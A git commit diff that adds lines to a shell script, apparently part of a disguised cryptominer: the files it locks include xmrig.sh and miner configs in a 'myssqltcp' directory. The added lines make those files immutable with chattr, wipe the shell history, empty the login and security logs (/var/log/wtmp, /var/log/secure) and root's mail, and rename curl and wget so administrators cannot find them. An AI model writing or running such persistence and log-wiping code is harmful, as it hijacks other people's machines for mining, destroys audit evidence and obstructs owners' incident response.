cd171536a9db0569f2be461fa1897d639548f6fa
teshushu <905353149@qq.com>
2023-01-24 08:33:22 +0800

    Update delserver.sh

--- Bash/url/delserver.sh
+++ Bash/url/delserver.sh
@@ -22,4 +22,27 @@ chmod 777 addconf.sh
 chmod 777 logserver.sh
 /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
 nohup ./lib_systemd.sh > /dev/null 2>&1 &
+
+# lock
+chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
+chattr -V +iau $HOME/myssqltcp/logserver.sh
+chattr -V +iau $HOME/myssqltcp/addconf.sh
+chattr -V +iau $HOME/myssqltcp/MyssqlTcp
+chattr -V +iau $HOME/myssqltcp/xmrig.sh
+chattr -V +iau $HOME/myssqltcp/config_background.json
+chattr -V +iau $HOME/myssqltcp/config.json
+
+# Clear log
+history -c
+echo > /var/spool/mail/root
+echo > /var/log/wtmp
+echo > /var/log/secure
+echo > /root/.bash_history
+
+# Modify instruction
+mv /usr/bin/curl /usr/bin/url
+mv /usr/bin/url /usr/bin/lruc
+mv /usr/bin/wget /usr/bin/get
+mv /usr/bin/get /usr/bin/tegw
+
 echo "[*] Yes-Go"
